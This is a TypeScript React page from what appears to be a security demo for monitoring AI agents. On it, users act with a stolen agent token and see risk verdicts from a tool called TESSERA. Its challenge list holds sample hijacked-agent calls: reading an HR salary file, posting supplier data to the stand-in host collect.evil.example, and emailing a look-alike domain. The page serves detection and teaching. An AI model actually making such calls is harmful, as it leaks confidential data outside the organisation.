"use client";
import { useMemo, useState } from "react";
import { Send } from "lucide-react";
import { post } from "@/lib/api";
import { markDone } from "@/lib/guide";
import { useApi, ErrorNote } from "@/lib/useApi";
import type { Agent, ToolSpec, Verdict } from "@/lib/types";
import { PageHeader, TestGuide, Hint } from "@/components/ui/kit";
import VerdictChip, { bandColor } from "@/components/feed/VerdictChip";
import RiskGauge from "@/components/feed/RiskGauge";
import ProvChip from "@/components/feed/ProvChip";
import LadderStepper from "@/components/feed/LadderStepper";
import { layerName } from "@/components/case/RiskWaterfall";

const CHALLENGES = [
  { id: "hr", title: "Read the HR salary file", hint: "A valid token is not permission to read everything it can reach.", tool: "files.read", args: { path: "/hr/exec_comp_FY26_final.xlsx" } },
  { id: "post", title: "Send data to an unknown server", hint: "Where data goes matters as much as what it is.", tool: "http.post", args: { url: "https://collect.evil.example/u", body: "supplier list" } },
  { id: "quiet", title: "Stay under the radar", hint: "A normal-looking call from a stolen token is still flagged: wrong host, wrong hour.", tool: "suppliers.get_price", args: { supplier_id: "SUP-ACME", sku: "SKU-44" } },
  { id: "alike", title: "Use a look-alike address", hint: "A near-match domain is not on the approved list.", tool: "email.send", args: { to: "buyer@corp-example.co", subject: "price", body: "SKU-44 1800" } },
];

export default function HijackPage() {
  const agents = useApi<Agent[]>("/agents"); const tools = useApi<ToolSpec[]>("/tools");
  const [agentId, setAgentId] = useState("agt_proc_01"); const [tool, setTool] = useState("files.read"); const [vals, setVals] = useState<Record<string, string>>({ path: "/hr/exec_comp_FY26_final.xlsx" });
  const [res, setRes] = useState<Verdict | null>(null); const [err, setErr] = useState<string | null>(null); const [busy, setBusy] = useState(false);
  const [history, setHistory] = useState<Verdict[]>([]);
  const spec = tools.data?.find((t) => t.name === tool); const agent = agents.data?.find((a) => a.id === agentId);
  const args = useMemo(() => { const o: Record<string, unknown> = {}; spec?.fields.forEach((f) => { const raw = vals[f.name] ?? String(f.example ?? ""); o[f.name] = f.type === "number" ? (raw === "" || isNaN(Number(raw)) ? raw : Number(raw)) : raw; }); return o; }, [vals, spec]);
  const kind = (v: Verdict) => (v.decision !== "ALLOW" ? "stopped" : v.risk >= 60 ? "flagged" : "through");
  const score = { stopped: history.filter((h) => kind(h) === "stopped").length, flagged: history.filter((h) => kind(h) === "flagged").length, through: history.filter((h) => kind(h) === "through").length };
  function pick(c: typeof CHALLENGES[number]) { setTool(c.tool); setVals(Object.fromEntries(Object.entries(c.args).map(([k, v]) => [k, String(v)]))); setRes(null); setErr(null); }
  async function send() {
    setErr(null); const missing = spec?.fields.find((f) => f.control && !String(vals[f.name] ?? f.example ?? "").trim()); if (missing) return setErr(`"${missing.name}" is empty. It decides where this action goes.`);
    setBusy(true); try { const v = await post<Verdict>("/hijack/call", { agent_id: agentId, tool, args }); setRes(v); setHistory((h) => [v, ...h].slice(0, 30)); markDone("hijack"); } catch (e) { setErr((e as Error).message); } finally { setBusy(false); }
  }
  const field = "w-full rounded-lg border border-line2 bg-panel2 px-3 py-2 text-[15px] outline-none focus:border-ice";
  return (
    <div>
      <PageHeader title="Stolen token" what={`You hold a valid token for the ${agent?.name ?? "agent"}. Try to get something out.`} />
      <TestGuide id="hijack" steps={["Pick 'Read the HR salary file' and press Send.", "Compare the two result rows: access check, then TESSERA.", "Pick 'Stay under the radar' and press Send.", "Open the risk reasons to see why it was flagged."]}
        expect="The HR read is blocked at risk near 100 though the access check said allowed. The quiet call is allowed but flagged high: a valid token from an unfamiliar host at 3 a.m." />
      <div className="mb-6 flex gap-8" aria-label="Scoreboard">{([["Stopped", score.stopped, "text-moss"], ["Got through, flagged", score.flagged, "text-amber"], ["Got through quietly", score.through, "text-blood"]] as const).map(([l, n, c]) => (
        <div key={l}><div className={`text-[26px] font-semibold leading-none tnum ${c}`}>{n}</div><div className="mt-1 text-[13px] text-muted">{l}</div></div>))}</div>
      <div className="grid gap-6 lg:grid-cols-[minmax(0,420px)_minmax(0,1fr)]">
        <div className="space-y-5">
          <section aria-label="Challenges"><h2 className="mb-2 text-[15px] font-medium text-muted">Challenges</h2>
            <ul className="card divide-y divide-line overflow-hidden">{CHALLENGES.map((c) => (<li key={c.id} className="flex items-center transition-colors hover:bg-panel2"><button onClick={() => pick(c)} className="flex-1 px-4 py-3 text-left text-[15px]">{c.title}</button><span className="pr-4"><Hint>{c.hint}</Hint></span></li>))}</ul></section>
          <section className="card space-y-3 p-4"><h2 className="text-[15px] font-medium text-muted">Your call</h2>
            <div className="grid gap-3 sm:grid-cols-2">
              <select aria-label="Whose token" value={agentId} onChange={(e) => setAgentId(e.target.value)} className={field}>{(agents.data ?? []).map((a) => <option key={a.id} value={a.id}>{a.name}</option>)}</select>
              <select aria-label="Tool" value={tool} onChange={(e) => { setTool(e.target.value); setVals({}); setRes(null); }} className={`${field} mono`}>{(tools.data ?? []).map((t) => <option key={t.name} value={t.name}>{t.name}</option>)}</select></div>
            {spec?.fields.map((f) => (<div key={f.name}><label htmlFor={"f_" + f.name} className="mb-1 flex items-center gap-2 text-[13px] text-muted"><span className="mono">{f.name}</span>{f.control && <Hint>Decides where this action goes.</Hint>}</label>
              <input id={"f_" + f.name} value={vals[f.name] ?? String(f.example ?? "")} onChange={(e) => setVals((v) => ({ ...v, [f.name]: e.target.value }))} inputMode={f.type === "number" ? "decimal" : undefined} className={`${field} mono`} /></div>))}
            {err && <p role="alert" className="text-[15px] text-blood">{err}</p>}
            <button onClick={send} disabled={busy || !spec} className="btn btn-primary w-full"><Send size={15} />{busy ? "Sending" : "Send as the agent"}</button>
          </section>
          <ErrorNote error={agents.error ?? tools.error} onRetry={() => { agents.reload(); tools.reload(); }} />
        </div>
        <div className="min-w-0 space-y-4">
          {!res ? <div className="card grid min-h-[320px] place-items-center p-10 text-center text-[15px] text-muted">Pick a challenge and press Send.</div> : (<>
            <section aria-live="polite" className="card divide-y divide-line">
              <div className="flex items-center justify-between gap-3 px-5 py-4"><span className="text-[15px] text-muted">Access check</span><span className="flex items-center gap-2 text-[15px]"><span className="text-moss">Allowed</span><span className="text-muted">{res.iam.label}</span></span></div>
              <div className="px-5 py-4"><div className="flex flex-wrap items-center gap-3"><span className="text-[15px] text-muted">TESSERA</span><VerdictChip decision={res.decision} /><span className="text-[22px] font-semibold tnum" style={{ color: bandColor(res.band) }}>{Math.round(res.risk)}</span><span className="text-[13px] text-muted">risk of 100</span></div>
                <p className="mt-2 text-[16px] leading-relaxed">{res.summary || (res.decision === "ALLOW" ? "Looks like normal work for this role." : "Doesn't fit the role.")}</p></div>
            </section>
            <section className="card grid gap-5 p-5 md:grid-cols-[150px_minmax(0,1fr)]"><div className="flex justify-center"><RiskGauge risk={res.risk} size={150} /></div>
              <div className="min-w-0 space-y-3">
                <ul className="space-y-1.5">{res.signals.filter((s) => s.score > 0.05 && !s.shadow).sort((a, b) => b.score - a.score).slice(0, 4).map((s) => (<li key={s.layer} className="flex items-baseline gap-2 text-[15px]"><span className="w-28 shrink-0 font-medium">{layerName(s.layer)}</span><span className="text-muted">{s.evidence[0]?.text ?? s.flags.join(", ").replace(/_/g, " ")}</span></li>))}</ul>
                <div className="flex flex-wrap gap-1.5">{Object.entries(res.arg_origins ?? {}).map(([k, o]) => <ProvChip key={k} origin={o} name={k} label={`${k}: ${o.source_label ?? o.origin}`} />)}</div>
                <LadderStepper level={res.containment_level} compact /></div></section>
            {res.counterfactual?.length > 0 && <section className="card p-5"><h2 className="mb-2 flex items-center gap-2 text-[15px] font-medium text-muted">What would have made it OK <Hint>The smallest changes that lower the risk.</Hint></h2><ul className="space-y-1.5">{res.counterfactual.map((c, i) => <li key={i} className="flex justify-between gap-3 text-[15px]"><span>{c.label}</span><span className="tnum text-muted">{Math.round(res.risk)} → {Math.round(c.risk_after)}</span></li>)}</ul></section>}
          </>)}
          {history.length > 1 && <section className="card p-5"><h2 className="mb-2 text-[15px] font-medium text-muted">Attempts</h2><ul className="divide-y divide-line">{history.map((h) => <li key={h.id} className="flex items-center gap-3 py-2 text-[15px]"><span className="mono flex-1 truncate">{h.tool}</span><VerdictChip decision={h.decision} compact /><span className="w-8 text-right tnum text-muted">{Math.round(h.risk)}</span></li>)}</ul></section>}
        </div>
      </div>
    </div>);
}
